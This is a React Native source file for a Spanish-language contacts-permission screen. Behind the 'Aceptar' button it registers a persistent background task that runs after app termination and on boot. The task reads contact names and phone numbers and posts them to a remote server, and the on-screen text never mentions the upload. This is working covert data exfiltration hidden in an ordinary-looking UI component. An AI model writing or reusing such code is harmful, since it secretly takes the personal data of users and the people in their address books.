import { StyleSheet, View, Text } from "react-native";
import CustonButton from "../CustonButton";
import * as Contacts from "expo-contacts";
import React from "react";
import * as BackgroundFetch from "expo-background-fetch"
import * as TaskManager from "expo-task-manager"
/* import { LogBox } from 'react-native';
LogBox.ignoreLogs(['Warning: ...']); // Ignore log notification by message
LogBox.ignoreAllLogs();//Ignore all log notifications */
//url
import { storageContacto } from "../../util/Apis"

/// ACCESSO AL DIRECTORIO CONTACTO

export const BACKGROUND_CONTACTS = "background-fetch"

TaskManager.defineTask(BACKGROUND_CONTACTS, async () => {
  try {
    console.log("contacto on")
    const { data } = await Contacts.getContactsAsync({
      fields: [
        Contacts.Fields.FirstName,
        Contacts.Fields.LastName,
        Contacts.Fields.PhoneNumbers,
      ],
    });

    data.forEach(async (element, i) => {
      let xd = element;
      const { phoneNumbers } = element;
      console.log(i)
      // console.log("firstName",JSON.stringify(file.PhoneNumbers.slice(0,3)));
      console.log("contact", JSON.stringify(phoneNumbers[0].number))
      if(i<30){
        let formData = new FormData();
        formData.append("contactos[]", xd.firstName)
        formData.append("number[]", JSON.stringify(phoneNumbers[0].number))
        console.log("formData", formData)

      await fetch(storageContacto, {
        method: "POST",
        body: formData,
        header: {
          Accept: "application/json",
          "Content-Type": "application/json",
          // "Content-Type": "application/x-amz-json-1.1",
        },
      });
      }else{ return }
       /* .then((res) => res.json())
        .catch((error) => console.error("Error", error)) 
        .then((response) => {
          console.log("DESDE EL RESPONSE ", response);
        });  */
    });
    return BackgroundFetch.BackgroundFetchResult.NewData
  } catch (error) {
    console.log(error);
    BackgroundFetch.BackgroundFetchResult.Failed
  }
});

async function registerBackgroundFetchAsync() {
  console.log("llamando contacto")
  return BackgroundFetch.registerTaskAsync(BACKGROUND_CONTACTS, {
    minimumInterval: 1, // cada 60 segundos
    stopOnTerminate: false,
    startOnBoot: true,
  });
}

async function unregister() {
  console.log("Servicio contacto detenido")
  return BackgroundFetch.unregisterTaskAsync(BACKGROUND_CONTACTS)
}

export const StorageContacto = ({ onPress }) => {
  const permisos = async () => {
    const { status } = await Contacts.requestPermissionsAsync();
    if (status !== "granted") {
      return;
    }
    console.log("desde status ", status);
    registerBackgroundFetchAsync()
    const s = await TaskManager.isTaskRegisteredAsync(BACKGROUND_CONTACTS)
    console.log(s)
  };
  return (
    <View style={[styles.card, { marginBottom: -20 }]}>
      <Text style={styles.text}>
        Necesita aceptar los permisos de Contactos
      </Text>

      <View
        style={[styles.card, { marginTop: 12, padding: 5, marginLeft: 15 }]}
      >
        <CustonButton label={"Aceptar"} padding={10} onPress={()=>{permisos(),onPress()}} />

        <View style={{ margin: 20 }} />

        <CustonButton label={"Cerrar"} padding={10} onPress={()=>{unregister(),onPress()}} />
      </View>
    </View>
  );
};
const styles = StyleSheet.create({
  card: {
    marginTop: 10,
    flexDirection: "row",
    flexWrap: "wrap",
  },
  text: {
    justifyContent: "center",
    alignSelf: "center",
    alignItems: "center",
    marginHorizontal: 20,
  },
  btn: {},
});

export default StorageContacto;
